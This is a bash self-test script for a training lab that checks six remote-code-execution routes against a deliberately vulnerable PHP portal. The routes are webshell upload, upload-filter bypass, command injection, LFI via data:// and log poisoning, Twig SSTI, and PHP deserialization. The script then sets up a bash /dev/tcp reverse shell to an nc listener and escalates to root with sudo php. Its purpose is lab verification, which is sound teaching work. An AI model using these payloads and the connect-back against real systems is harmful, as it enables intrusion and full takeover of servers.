#!/usr/bin/env bash
# =============================================================================
#  Road to Root — web lab self-test (Chapter 09 "Foothold")
#
#  Runs on the ATTACKER box and drives the "Hollow Share" portal on target-web.
#  For each of the six RCE routes it triggers the bug non-interactively with
#  curl and asserts the www-data foothold flag comes back. Then it runs ONE
#  real reverse-shell connect-back (bash /dev/tcp -> nc listener) and the
#  www-data -> root capstone, asserting the root flag lands on the listener.
#
#     docker cp tests/verify_web.sh attacker:/tmp/
#     docker exec attacker bash /tmp/verify_web.sh target-web
#
#  Exit 0 = all six routes + the reverse shell + root worked. (Used by CI.)
# =============================================================================
set -u
HOST="${1:-target-web}"
BASE="http://${HOST}"
ATTACKER="${2:-attacker}"      # hostname the reverse shell calls back to
FLAG='R2R{'
ROOTFLAG='R2R{www_data_t0_r00t'
PASS=0; FAIL=0
pass(){ echo "  [PASS] $1"; PASS=$((PASS + 1)); }
fail(){ echo "  [FAIL] $1"; FAIL=$((FAIL + 1)); }
# contains <needle> <<< haystack-on-stdin
has(){ grep -qF "$1"; }

echo "== target: $BASE  (callback host: $ATTACKER) =="

echo "== waiting for Apache to come up =="
up=0
for i in $(seq 1 60); do
  if curl -fs -o /dev/null "$BASE/index.php"; then up=1; break; fi
  sleep 1
done
[ "$up" = 1 ] && echo "  app is up" || { echo "  [FAIL] app never came up"; exit 1; }

echo "== control: foothold flag must NOT be web-served directly =="
if curl -fs "$BASE/../flag.txt" 2>/dev/null | has "$FLAG" \
   || curl -fs "$BASE/flag.txt" 2>/dev/null | has "$FLAG"; then
  fail "control — flag reachable without code execution (setup broken!)"
else
  pass "control — /var/www/flag.txt is not directly web-served"
fi

# ---------------------------------------------------------------------------
# A — Unrestricted file upload -> PHP webshell
# ---------------------------------------------------------------------------
printf '%s' '<?php system($_GET["c"]); ?>' > /tmp/shellA.php
curl -fs -F "file=@/tmp/shellA.php" "$BASE/upload.php" >/dev/null
if curl -fs "$BASE/uploads/shellA.php?c=cat+/var/www/flag.txt" | has "$FLAG"; then
  pass "A  unrestricted upload -> webshell (uploads/shellA.php)"
else
  fail "A  unrestricted upload -> webshell"
fi

# ---------------------------------------------------------------------------
# B — Upload filter bypass (.pht + GIF89a magic bytes + spoofed image type)
# ---------------------------------------------------------------------------
printf 'GIF89a;\n%s' '<?php system($_GET["c"]); ?>' > /tmp/shellB.pht
curl -fs -F "image=@/tmp/shellB.pht;type=image/gif" "$BASE/share.php" >/dev/null
if curl -fs "$BASE/shares/shellB.pht?c=cat+/var/www/flag.txt" | has "$FLAG"; then
  pass "B  filter bypass (.pht + GIF89a + image/gif spoof)"
else
  fail "B  filter bypass"
fi

# ---------------------------------------------------------------------------
# C — OS command injection via the ping tool
# ---------------------------------------------------------------------------
if curl -fs -G "$BASE/tools.php" \
     --data-urlencode 'host=127.0.0.1; cat /var/www/flag.txt' | has "$FLAG"; then
  pass "C  command injection (ping host=...; cat flag)"
else
  fail "C  command injection"
fi

# ---------------------------------------------------------------------------
# D — LFI -> RCE.  Two techniques, both must fire:
#   D1 data:// wrapper (needs allow_url_include=On)
#   D2 Apache access-log poisoning (User-Agent PHP, then include the log)
# ---------------------------------------------------------------------------
B64=$(printf '%s' '<?php system("cat /var/www/flag.txt"); ?>' | base64 -w0)
if curl -fs -G "$BASE/view.php" \
     --data-urlencode "page=data://text/plain;base64,${B64}" | has "$FLAG"; then
  pass "D1 LFI -> RCE via data:// wrapper"
else
  fail "D1 LFI -> RCE via data:// wrapper"
fi
# NB: single-quoted array key — Apache escapes " in the combined log, which
# would break a $_GET["c"] payload; $_GET['c'] logs (and parses) cleanly.
POISON=$'<?php system($_GET[\'c\']); ?>'
curl -fs -A "$POISON" "$BASE/index.php" >/dev/null
if curl -fs -G "$BASE/view.php" \
     --data-urlencode 'page=/var/log/apache2/access.log' \
     --data-urlencode 'c=cat /var/www/flag.txt' | has "$FLAG"; then
  pass "D2 LFI -> RCE via access-log poisoning"
else
  fail "D2 LFI -> RCE via access-log poisoning"
fi

# ---------------------------------------------------------------------------
# E — SSTI (Twig).  Confirm {{7*7}} then RCE via the map('system') gadget.
# ---------------------------------------------------------------------------
if curl -fs -G "$BASE/preview.php" --data-urlencode 'name={{7*7}}' | has "Hi 49,"; then
  echo "     (confirmed: {{7*7}} -> 49)"
fi
if curl -fs -G "$BASE/preview.php" \
     --data-urlencode "name={{['cat /var/www/flag.txt']|map('system')|join}}" | has "$FLAG"; then
  pass "E  SSTI (Twig) -> RCE via map('system')"
else
  fail "E  SSTI (Twig) -> RCE"
fi

# ---------------------------------------------------------------------------
# F — PHP insecure deserialization (MaintenanceTask gadget in the prefs cookie)
# ---------------------------------------------------------------------------
CMD='cat /var/www/flag.txt'; LEN=${#CMD}
SER="O:15:\"MaintenanceTask\":1:{s:3:\"cmd\";s:${LEN}:\"${CMD}\";}"
COOKIE=$(printf '%s' "$SER" | base64 -w0)
if curl -fs --cookie "prefs=${COOKIE}" "$BASE/prefs.php" | has "$FLAG"; then
  pass "F  insecure deserialization (__wakeup gadget)"
else
  fail "F  insecure deserialization"
fi

# ---------------------------------------------------------------------------
# Reverse shell connect-back + capstone (www-data -> root)
#   Listener queues: id ; read foothold flag ; sudo php -> root flag.
# ---------------------------------------------------------------------------
echo "== reverse shell + capstone (bash /dev/tcp -> nc, then sudo php) =="
REVOUT=/tmp/rev.out; rm -f "$REVOUT"
(
  printf 'id\n'
  printf 'cat /var/www/flag.txt\n'
  printf 'sudo /usr/bin/php -r %s\n' "'system(\"id; cat /root/flag.txt\");'"
  sleep 6
) | timeout 15 nc -lvnp 4444 > "$REVOUT" 2>&1 &
NCPID=$!
# An interactive reverse shell keeps the socket open, so nc never returns on
# its own — `timeout` bounds the listener (the commands run in the first ~2s).
sleep 1
PAYLOAD="bash -c \"bash -i >& /dev/tcp/${ATTACKER}/4444 0>&1\""
ENC=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$PAYLOAD")
curl -fs "$BASE/uploads/shellA.php?c=${ENC}" >/dev/null 2>&1 &
wait "$NCPID" 2>/dev/null

if has 'uid=33(www-data)' < "$REVOUT"; then
  pass "reverse shell landed as www-data"
else
  fail "reverse shell landed as www-data"
fi
if has "$ROOTFLAG" < "$REVOUT"; then
  pass "capstone: www-data -> root, read /root/flag.txt"
else
  fail "capstone: www-data -> root"
fi

echo "== score =="
echo "  PASS=$PASS  FAIL=$FAIL   (expected: 10 pass / 0 fail)"
if [ "$FAIL" -eq 0 ]; then
  echo "  ALL SIX WEB ROUTES + REVERSE SHELL + ROOT -- OK"
  exit 0
else
  echo "  SOME CHECKS FAILED"
  exit 1
fi
